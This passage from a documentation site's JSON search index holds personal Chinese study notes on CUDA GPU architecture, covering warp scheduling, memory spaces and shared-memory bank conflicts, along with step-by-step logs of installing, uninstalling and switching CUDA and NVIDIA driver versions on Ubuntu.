warp\u8c03\u5ea6\u5668\u7ef4\u62a4\u4e00\u4e2a\u6808\uff1amask(32bit)\uff0c\u5408\u5e76\u70b9 - \u9047\u5230\u5206\u652f\u6307\u4ee4\u65f6\uff0c\u5c06\u4e00\u4e2a\u5206\u652f\u7684mask\u548c\u5408\u5e76\u70b9push\u5230stack\uff0c\u7136\u540e\u6267\u884c\u53e6\u4e00\u4e2a\u5206\u652f(~mask)\uff0c\u7ed3\u675f\u65f6sync\uff0c\u4ecestack\u4e2dpop\u6062\u590d</p> <p>CUDA and Application to Task-Based Programming (part 1) | Eurographics'2021 Tutorial (youtube.com) - 2:17:30\uff0c\u89e3\u91caCSR</p> <p>ITS - Instead of just scheduling warps as a whole, the warp scheduler can switch between active branches of warps. While execution of divergent branches still has to be serialized, it can be interleaved     - \u8c03\u5ea6\u7684\u5355\u4f4d\u4ecewarp\u53d8\u4e3a\u4e86branch - \u6d88\u9664\u4e86intra-warp synchronization\u7684\u9650\u5236 - \u5ef6\u8fdf\u9690\u85cf\uff1alarger set of potential work to choose from</p> <p></p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#memory\u5c42\u6b21","title":"memory\u5c42\u6b21","text":"<p>In CUDA, these hardware resources are exposed in the form of a number of memory spaces, each with different properties designed for different kinds of access patterns.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#global","title":"global","text":"<ul> <li>\u4e00\u822c\u7684\u6570\u636e\u5b58\u50a8</li> <li>\u5f88\u6162\uff1abandwidth: \u2248 300\u2013700 GiB/s (GDDR5/6 vs HMB2)     \u2022 non-cached coalesced access: 375 cycles      \u2022 L2 cached access: 190 cycles      \u2022 L1 caches access: 30 cycles</li> <li> <p>cache\u8bbe\u8ba1\uff1a</p> <ul> <li>\u4e0d\u662f\u4e3a\u4e86\u5229\u7528\u65f6\u95f4\u590d\u7528\uff0c\u800c\u662fsmooth-out access patterns<ul> <li>64 B L1$, 37 B L2$ per thread</li> </ul> </li> <li>\u4e0d\u8981\u50cfCPU\u4e00\u6837\u5206\u5757\uff0c\u800c\u662f\u4f7f\u7528shared memory</li> <li>L1\u5199\u76f4\u8fbe\uff0cL2\u5199\u56de</li> </ul> </li> <li> <p>try to get coalescing per warp </p> </li> </ul> <p>\u7c92\u5ea6\u5b9e\u9a8c - \u6027\u80fd\u968f\u7740\u8bbf\u95ee\u7684cacheline\u6570\u76ee\u589e\u957f\u800c\u7ebf\u6027\u964d\u4f4e </p> <p>vector load/store</p> <ul> <li>\u8ba1\u7b97\u5730\u5740\u6ca1\u529e\u6cd5\u5ef6\u8fdf\u9690\u85cf\uff0c\u56e0\u4e3a\u8bbf\u5b58\u64cd\u4f5c\u5bf9\u5176\u7ed3\u679c\u6709\u4f9d\u8d56</li> </ul> <p><code>__restrict</code>\uff1aThis instructs the compiler to assume that the input and output will never point to overlapping memory regions. - As a result, the compiler can potentially, e.g., fetch input data through faster non-coherent caches.</p> <p>128bit\u5bbd\uff0816B\uff09</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#const","title":"const","text":"<ul> <li> <p>cached</p> <ul> <li>const cache\uff0c\u8fc7\u53bb\u53ebtexture cache</li> </ul> </li> <li> <p>read only, uniform</p> <ul> <li>e.g.: coefficients, used to pass kernel parameters</li> </ul> </li> <li>broadcasting<ul> <li>all thread read same value</li> <li>otherwise diverged, slowdown</li> </ul> </li> <li> <p>limited to 64 KiB</p> </li> <li> <p>As long as access happens uniformly, constant memory can provide very low access latencies.</p> </li> <li>For divergent access patterns, normal global memory can typically provide better access latencies due to its different cache design (as long as the access hits the cache).</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#tex","title":"tex","text":"<p>optimized for 2D spatial access. - optimal for neither row-wise nor column-wise access, it can handle both with similar efficiency.</p> <p>prior to Volta  \u2022 Textures tend to perform at least as good, sometimes better  \u2022 put less stress on L2 cache  \u2022 L1 cache free for other tasks</p> <p>now  \u2022 advanced Unified Cache (L1 + Tex)  \u2022 Textures still perform best for spatially local access pattern  \u2022 but can also be slower if access pattern and cache hits favor linear memory</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#shared-memory","title":"shared memory","text":"<p>crossbar - 32bit bank - simultaneous to distinct bank </p> <p>shared memory - 32 bank, consecutive 4-byte elements map to one bank - Each memory bank can serve 4-byte loads and stores from and to the addresses it\u2019s responsible for. - \u540c\u4e00\u65f6\u95f4\u4e0d\u80fd\u6709\u591a\u4e2athread\u8bbf\u95ee\u540c\u4e00\u4e2abank     - N-way bank conflict     - \u7279\u6b8a\u60c5\u51b5\uff0c\u8bbf\u95ee\u76f8\u540c\u5730\u5740\uff0c\u53ef\u4ee5\u5e7f\u64ad </p> <p>32x32\u7684matrix\uff0c\u5bf9\u884c\u5217\u5206\u522b\u6c42\u548c\uff0c\u4f7f\u752832\u4e2a\u7ebf\u7a0b\u5e76\u884c - \u6bcf\u5217\u5143\u7d20\u4f4d\u4e8e\u76f8\u540cbank\uff0c\u56e0\u6b64\u884c\u6c42\u548c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u521a\u597d\u8bbf\u95ee\u76f8\u540cbank\uff0c\u5bfc\u81f4\u51b2\u7a81 </p> <p>trick - \u6dfb\u52a0\u4e00\u4e2adummy colum\u540e\uff0c\u6bcf\u884c\u6bcf\u5217\u5143\u7d20\u5747\u4f4d\u4e8e\u4e0d\u540cbank </p> <p>\u4f5c\u7528 - inter-thread communication\uff1ablock\u5185\u7684\u4e00\u4e2a\u5171\u4eab\u53d8\u91cf - reduce global memory access -&gt; manual cache     - \u5148\u628a\u6570\u636e\u4eceglobal load\u5230shared memory\u518d\u5904\u7406 - adjust global memory access pattern - indexed access      - \u666e\u901a\u53d8\u91cf\u6570\u7ec4\uff0c\u4f1aspill\u5230local memory\u4e2d - combine costly operations</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#part-3","title":"part 3","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#managed-memory","title":"managed memory","text":"<p>static\u5206\u914d: <code>device</code> dynamic\u5206\u914d(cpu\u4ee3\u7801\u6267\u884c\u5206\u914d)\uff1acudaMalloc</p> <p>movement - cudaMemcpy, cudaMemcpyToSymbol, cudaMemcpyFromSymbol</p> <p>managed mem - static: <code>__managed__</code> - dynamic: <code>cudaMallocManaged</code></p> <p>\u5728CC(compute capac)6.0\u4e4b\u524d\uff0cdata migration\u662f\u7c97\u7c92\u5ea6\u7684\uff0c\u4e0d\u652f\u6301CPU\u548cGPU concurrent access\u3002 6.0\u4e4b\u540e\uff0c\u5f15\u5165\u7ec6\u7c92\u5ea6\u7684page fault system\uff0c\u9875\u4e3a\u7c92\u5ea6\uff0c\u6027\u80fd\u5927\u5e45\u63d0\u9ad8 -  concurrent access\u4ecd\u7136\u4e0d\u80fd\u4fdd\u8bc1\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#its","title":"ITS","text":"<p>legacy - \u6240\u6709\u7ebf\u7a0b\u4f4d\u4e8e\u540c\u4e00\u4e2aPC\u3002\u9700\u8981\u6267\u884c\u5b8c\u4e00\u4e2a\u5206\u652f\u540e\u518d\u6267\u884c\u53e6\u4e00\u4e2a\uff08\u56e0\u4e3a\u53ea\u6709\u4e00\u4e2aPC\uff0c\u7ebf\u7a0b\u65e0\u6cd5\u5355\u72ec\u8bb0\u5f55\u81ea\u5df1\u7684\u4f4d\u7f6e\uff09 - \u6267\u884c\u4e00\u4e2a\u5206\u652f\u65f6\uff0c\u5c06\u53e6\u4e00\u4e2a\u5206\u652f\u538b\u5165\u6808\u4e2d\u5373\u53ef\uff08dfs\uff1f\uff09\u8be5\u5206\u652f\u6267\u884c\u7ed3\u675f\u65f6\u901a\u8fc7sync\u8bed\u53e5\u5f39\u6808\uff0c\u56de\u5230\u5408\u5e76\u70b9\u3002</p> <p>its - \u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u9501 - \u53ea\u4fdd\u8bc1resident warp\u662f\u53ef\u4ee5\u6267\u884c\u5b8c\u7684     - thread will wait forever if their progress depends on non-redident warp     - \u4e00\u4e2aSM\u80fd\u540c\u65f6\u6267\u884c\u7684warp\u662f\u6709\u9650\u7684\uff0c\u5982\u679cwarp\u592a\u591a\uff0c\u4f1a\u653e\u5728buffer\u91cc\uff0c\u4ecd\u6709\u53ef\u80fd\u5bfc\u81f4\u6b7b\u9501\uff1f</p> <ul> <li>\u9700\u8981\u663e\u793a\u540c\u6b65warp </li> </ul> <p>later warp primitve  reduce(&gt;8.0) </p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#tensor-core_1","title":"tensor core","text":"<ul> <li>cublas\u4ee5\u540e\u9ed8\u8ba4\u4f1a\u5c3d\u53ef\u80fd\u4f7f\u7528tensor core\uff0c\u9664\u975e\u5b9a\u4e49CUDA_PREDANTIC_MATH</li> <li>baseline\u662f\u4f7f\u7528tiling, shared memroy\uff0c\u53ef\u4ee5\u770b\u5230cublas\u975e\u5e38\u91cd\u8981\u3002<ul> <li>\u4f46\u662f\u5206\u6790\u6a21\u578b\u5982\u4f55\u5206\u6790\u95ed\u6e90\u7684SASS\u53ef\u6267\u884c\u6587\u4ef6\u5462\uff1f </li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#summary","title":"summary","text":"<ul> <li>03-CUDA-Fundamental-Optimization-Part-1.pdf (ornl.gov)</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/","title":"CUDA\u7f16\u7a0b&\u5de5\u5177","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Tutorial 01: Say Hello to CUDA - CUDA Tutorial (cuda-tutorial.readthedocs.io)</li> <li>\u5317\u4eac\u5927\u5b66\u9ad8\u6027\u80fd\u8ba1\u7b97\u5e73\u53f0 (pku.edu.cn)</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda\u5b89\u88c5","title":"CUDA\u5b89\u88c5","text":"<p>\u603b\u7ed3\uff1a - \u6700\u7b80\u5355\u65b9\u5f0f\u662f\u770bcuda\u4e0b\u8f7d\u9875\u9762\u63d0\u4f9b\u7684\u5b89\u88c5\u547d\u4ee4 - deb\u5b89\u88c5\u8c8c\u4f3c\u65e0\u6cd5\u53ea\u5b89\u88c5cuda\uff0c\u4e0d\u5b89\u88c5\u9a71\u52a8 - runfile\u5b89\u88c5\u53ef\u4ee5\u505a\u5230\u4e0d\u91cd\u542f - cuda-toolkit-12-1\u5305\u542bcuda - nvidia-driver-530\u5305\u542b\u9a71\u52a8</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u6709\u7528\u94fe\u63a5","title":"\u6709\u7528\u94fe\u63a5","text":"<ul> <li>\u5b98\u65b9\u6587\u6863\uff1acuda-installation-guide-linux 12.1 documentation (nvidia.com)</li> </ul> <p>cuda\u4e0b\u8f7d - \u6700\u65b0\u7248\uff1aCUDA Toolkit 12.1 Downloads | NVIDIA Developer - \u5386\u53f2\u7248\uff1aCUDA Toolkit Archive | NVIDIA Developer</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4f9d\u8d56","title":"\u4f9d\u8d56","text":"<p>ps: \u9700\u8981\u7ba1\u7406\u5458\u6743\u9650</p> <ul> <li>nvidia gpu &amp; gpu driver</li> <li>gcc</li> <li>kernel header <pre><code>sudo apt install linux-headers-$(uname -r)\n</code></pre> <p>The CUDA Driver requires that the kernel headers and development packages for the running version of the kernel be installed at the time of the driver installation, as well whenever the driver is rebuilt.</p> </li> <li>\u7981\u7528noveau\u9a71\u52a8\uff0c\u5b89\u88c5cuda\u65f6\u4e5f\u4f1a\u81ea\u52a8\u5b89\u88c5nvidia\u9a71\u52a8</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e24\u79cd\u65b9\u5f0f","title":"\u4e24\u79cd\u65b9\u5f0f","text":"<ul> <li>rpm/deb packages</li> <li>runfile package</li> <li>\u548c\u53d1\u884c\u7248\u65e0\u5173(distribution-independent package)</li> </ul> <p>\u5b89\u88c5deb\u540e\uff0c\u662f\u6dfb\u52a0\u4e86\u4e00\u4e2arepo\u3002\u8fd8\u9700\u8981\u518d\u624b\u52a8install cuda\u3002 \u4e0d\u77e5\u4e3a\u4f55\u5b89\u88c5cuda\u65f6\u4e00\u5b9a\u4f1a\u81ea\u52a8\u66f4\u65b0driver\uff0c\u800c\u4f7f\u7528runfile\u65b9\u5f0f\uff0c\u5219\u53ef\u4ee5\u9009\u62e9\u4e0d\u5b89\u88c5\u9a71\u52a8\u3002</p> <pre><code>fyyuan@snode6 \u279c  archive dpkg --list |grep cuda-repo\nii  cuda-repo-ubuntu2004-11-5-local                             11.5.2-495.29.05-1                                             amd64        cuda repository configuration files\nii  cuda-repo-ubuntu2004-12-1-local                             12.1.0-530.30.02-1                                             amd64        cuda repository configuration files\n</code></pre> <pre><code>fyyuan@snode6 \u279c  archive sudo apt install cuda --no-install-recommends\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following packages were automatically installed and are no longer required:\n  cuda-11-5 cuda-cccl-11-5 cuda-command-line-tools-11-5 cuda-compiler-11-5 cuda-cudart-11-5 cuda-cudart-dev-11-5 cuda-cuobjdump-11-5 cuda-cupti-11-5 cuda-cupti-dev-11-5 cuda-cuxxfilt-11-5 cuda-demo-suite-11-5 cuda-documentation-11-5 cuda-driver-dev-11-5 cuda-gdb-11-5\n  cuda-libraries-11-5 cuda-libraries-dev-11-5 cuda-memcheck-11-5 cuda-nsight-11-5 cuda-nsight-compute-11-5 cuda-nsight-systems-11-5 cuda-nvcc-11-5 cuda-nvdisasm-11-5 cuda-nvml-dev-11-5 cuda-nvprof-11-5 cuda-nvprune-11-5 cuda-nvrtc-11-5 cuda-nvrtc-dev-11-5 cuda-nvtx-11-5\n  cuda-nvvp-11-5 cuda-runtime-11-5 cuda-samples-11-5 cuda-sanitizer-11-5 cuda-toolkit-11-5 cuda-toolkit-11-5-config-common cuda-toolkit-11-config-common cuda-tools-11-5 cuda-visual-tools-11-5 gds-tools-11-5 libcublas-11-5 libcublas-dev-11-5 libcufft-11-5 libcufft-dev-11-5\n  libcufile-11-5 libcufile-dev-11-5 libcurand-11-5 libcurand-dev-11-5 libcusolver-11-5 libcusolver-dev-11-5 libcusparse-11-5 libcusparse-dev-11-5 libnpp-11-5 libnpp-dev-11-5 libnvidia-common-495 libnvjpeg-11-5 libnvjpeg-dev-11-5 nsight-compute-2021.3.1 nsight-systems-2021.3.3\nUse 'sudo apt autoremove' to remove them.\nThe following additional packages will be installed:\n  cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1 cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers\n  cuda-drivers-530 cuda-gdb-12-1 cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1 cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1\n  cuda-nvtx-12-1 cuda-nvvp-12-1 cuda-opencl-12-1 cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 cuda-toolkit-12-1 cuda-toolkit-12-1-config-common cuda-toolkit-12-config-common cuda-tools-12-1 cuda-visual-tools-12-1 gds-tools-12-1 libcublas-12-1\n  libcublas-dev-12-1 libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1 libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvidia-cfg1-530 libnvidia-common-530\n  libnvidia-compute-530 libnvidia-decode-530 libnvidia-encode-530 libnvidia-extra-530 libnvidia-fbc1-530 libnvidia-gl-530 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1 libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.0 nsight-systems-2023.1.2\n  nvidia-compute-utils-530 nvidia-dkms-530 nvidia-driver-530 nvidia-kernel-common-530 nvidia-kernel-source-530 nvidia-modprobe nvidia-settings nvidia-utils-530 xserver-xorg-video-nvidia-530\nRecommended packages:\n  libnvidia-compute-530:i386 libnvidia-decode-530:i386 libnvidia-encode-530:i386 libnvidia-fbc1-530:i386 libnvidia-gl-530:i386\nThe following packages will be REMOVED:\n  cuda-drivers-495 libnvidia-cfg1-495 libnvidia-compute-495 libnvidia-decode-495 libnvidia-encode-495 libnvidia-extra-495 libnvidia-fbc1-495 libnvidia-gl-495 nvidia-compute-utils-495 nvidia-dkms-495 nvidia-driver-495 nvidia-kernel-common-495 nvidia-kernel-source-495\n  nvidia-utils-495 xserver-xorg-video-nvidia-495\nThe following NEW packages will be installed:\n  cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1 cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers-530\n  cuda-gdb-12-1 cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1 cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1 cuda-nvtx-12-1 cuda-nvvp-12-1\n  cuda-opencl-12-1 cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 cuda-toolkit-12-1 cuda-toolkit-12-1-config-common cuda-toolkit-12-config-common cuda-tools-12-1 cuda-visual-tools-12-1 gds-tools-12-1 libcublas-12-1 libcublas-dev-12-1\n  libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1 libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvidia-cfg1-530 libnvidia-common-530 libnvidia-compute-530\n  libnvidia-decode-530 libnvidia-encode-530 libnvidia-extra-530 libnvidia-fbc1-530 libnvidia-gl-530 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1 libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.0 nsight-systems-2023.1.2 nvidia-compute-utils-530\n  nvidia-dkms-530 nvidia-driver-530 nvidia-kernel-common-530 nvidia-kernel-source-530 nvidia-utils-530 xserver-xorg-video-nvidia-530\nThe following packages will be upgraded:\n  cuda cuda-drivers nvidia-modprobe nvidia-settings\n4 upgraded, 76 newly installed, 15 to remove and 21 not upgraded.\nNeed to get 0 B/3,012 MB of archives.\nAfter this operation, 7,064 MB of additional disk space will be used.\nDo you want to continue? [Y/n]\n</code></pre> <p>\u53ea\u5b89\u88c5cuda <pre><code>fyyuan@snode6 \u279c  archive sudo sh cuda_11.3.0_465.19.01_linux.run --toolkit\n===========\n= Summary =\n===========\n\nDriver:   Not Selected\nToolkit:  Installed in /usr/local/cuda-11.3/\nSamples:  Installed in /usr/local/cuda-11.3/\n\nPlease make sure that\n -   PATH includes /usr/local/cuda-11.3/bin\n -   LD_LIBRARY_PATH includes /usr/local/cuda-11.3/lib64, or, add /usr/local/cuda-11.3/lib64 to /etc/ld.so.conf and run ldconfig as root\n\nTo uninstall the CUDA Toolkit, run cuda-uninstaller in /usr/local/cuda-11.3/bin\n***WARNING: Incomplete installation! This installation did not install the CUDA Driver. A driver of version at least 465.00 is required for CUDA 11.3 functionality to work.\nTo install the driver using this installer, run the following command, replacing &lt;CudaInstaller&gt; with the name of this run file:\n    sudo &lt;CudaInstaller&gt;.run --silent --driver\n\nLogfile is /var/log/cuda-installer.log\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e0d\u540c\u7248\u672c\u51b2\u7a81\u6027","title":"\u4e0d\u540c\u7248\u672c\u51b2\u7a81\u6027","text":"<p>https://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html#handle-conflicting-installation-methods \u603b\u7ed3\uff1a - \u5b89\u88c5cuda tookit\uff0c\u4e0d\u540c\u7248\u672c\u95f4\u6ca1\u6709\u51b2\u7a81 - \u5b89\u88c5driver\uff0c\u4e0d\u540c\u7248\u672c\u4f7f\u7528\u540c\u4e00\u79cd\u65b9\u5f0f(deb\u6216runfile)\u5b89\u88c5\u6ca1\u6709\u51b2\u7a81</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5378\u8f7d","title":"\u5378\u8f7d","text":"<pre><code>sudo /usr/local/cuda-X.Y/bin/cuda-uninstaller  # runfile\n\n\n# cuda\nsudo apt-get --purge remove \"*cuda*\" \"*cublas*\" \"*cufft*\" \"*cufile*\" \"*curand*\" \\\n \"*cusolver*\" \"*cusparse*\" \"*gds-tools*\" \"*npp*\" \"*nvjpeg*\" \"nsight*\" \"*nvvm*\"\n\n# driver\nsudo apt purge \"*nvidia*\" \"libxnvctrl*\"   # \u53ea\u5378\u8f7dnvidia-driver-xxx\u4e0d\u591f\n\nsudo apt autoremove\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u73af\u5883\u53d8\u91cf\u9009\u62e9\u7248\u672c","title":"\u73af\u5883\u53d8\u91cf\u9009\u62e9\u7248\u672c","text":"<pre><code>cuda_version=\"cuda-11.0\"\nexport PATH=\"/usr/local/$cuda_version/bin:$PATH\"\nexport LD_LIBRARY_PATH=\"/usr/local/$cuda_version/lib64:$LD_LIBRARY_PATH\"\nexport demo_suite=\"/usr/local/$cuda_version/extras/demo_suite\"\n\ncd $demo_suite\n./deviceQuery   # \u83b7\u5f97\u8bbe\u5907\u4fe1\u606f\n</code></pre> <p>nvcc\u4f7f\u7528 <pre><code>nvcc -std=c++11 -lcurand -lcublas\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5b9e\u4f8b","title":"\u5b9e\u4f8b","text":"<p>\u5378\u8f7drunfile\u540e\u91cd\u542f\uff08\u6ca1\u91cd\u542f\u8fd8\u6709\u5f88\u591anvdia\u7684\u6a21\u5757\uff09 <pre><code>root@icarus3:/home/nfs/fyyuan# lsmod |grep nv\nnvidia_drm             65536  0\nnvidia_modeset       1273856  1 nvidia_drm\nnvidia              55701504  27 gdrdrv,nvidia_modeset\ndrm_kms_helper        184320  4 ast,nvidia_drm\ndrm                   495616  7 drm_kms_helper,drm_vram_helper,ast,nvidia,nvidia_drm,ttm\n</code></pre></p> <p>\u5b89\u88c5driver <pre><code>root@icarus3:/home/nfs/fyyuan# apt-cache policy nvidia-driver-530\nnvidia-driver-530:\n  Installed: 530.41.03-0ubuntu0.20.04.2\n  Candidate: 530.41.03-0ubuntu0.20.04.2\n  Version table:\n *** 530.41.03-0ubuntu0.20.04.2 500\n        500 https://mirrors.ustc.edu.cn/ubuntu focal-updates/restricted amd64 Packages\n        500 https://mirrors.ustc.edu.cn/ubuntu focal-security/restricted amd64 Packages\n        100 /var/lib/dpkg/status\n</code></pre></p> <p>\u5b89\u88c5cuda <pre><code>apt install nvidia-cuda-toolkit\n\nroot@icarus3:/home/nfs/fyyuan# nvcc -V\nnvcc: NVIDIA (R) Cuda compiler driver\nCopyright (c) 2005-2019 NVIDIA Corporation\nBuilt on Sun_Jul_28_19:07:16_PDT_2019\nCuda compilation tools, release 10.1, V10.1.243\n</code></pre></p> <p>\u7248\u672c\u592a\u8001\uff0c\u4e3a10.1\u7684</p> <p>i0\u4e0a\u6709\u8bb8\u591aapt source - cuda-ubuntu2004-12-1-local.list\u5bf9\u5e94/var/cuda-repo-ubuntu2004-12-1-local/\uff0c\u5305\u542b\u5f88\u591adeb\u6587\u4ef6 - cuda-ubuntu2004-x86_64.list\u4e3ahttps://developer.download.nvidia.com/compute/cuda   <code>deb [signed-by=/usr/share/keyrings/cuda-archive-keyring.gpg] https://developer.download.nvidia.com/compute/cuda    /repos/ubuntu2004/x86_64/ /</code> - source.list\u4e2d\u8fd8\u76f4\u63a5\u5305\u542b<code>deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ /</code> <pre><code>root@icarus0:/usr/local/cuda-12.1/bin# ls /etc/apt/sources.list.d/\ncuda-ubuntu2004-12-1-local.list       docker.list       nvidia-container-toolkit.list.save\ncuda-ubuntu2004-12-1-local.list.save  docker.list.save  nvidia-docker.list.save\ncuda-ubuntu2004-x86_64.list           mlnx.list\ncuda-ubuntu2004-x86_64.list.save      mlnx.list.save\n</code></pre></p> <p>\u5b98\u7f51\u6309\u7167deb(network)\uff0c\u53d1\u73b0\u6dfb\u52a0\u4e86\u6e90\uff0c\u8bbe\u7f6e\u4e86 <pre><code>root@icarus3:/home/nfs/fyyuan# apt install cuda\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\n  cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1\n  cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers cuda-drivers-530 cuda-gdb-12-1\n  cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1\n  cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1 cuda-nvtx-12-1 cuda-nvvp-12-1 cuda-opencl-12-1\n  cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 cuda-toolkit-12-1 cuda-toolkit-12-1-config-common\n  cuda-toolkit-12-config-common cuda-toolkit-config-common cuda-tools-12-1 cuda-visual-tools-12-1 default-jre default-jre-headless gds-tools-12-1\n  libcublas-12-1 libcublas-dev-12-1 libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1\n  libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1\n  libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.1 nsight-systems-2023.1.2 nvidia-modprobe nvidia-settings openjdk-11-jre\n  openjdk-11-jre-headless\nSuggested packages:\n  fonts-ipafont-gothic fonts-ipafont-mincho fonts-wqy-microhei | fonts-wqy-zenhei fonts-indic\nThe following NEW packages will be installed:\n  cuda cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1\n  cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 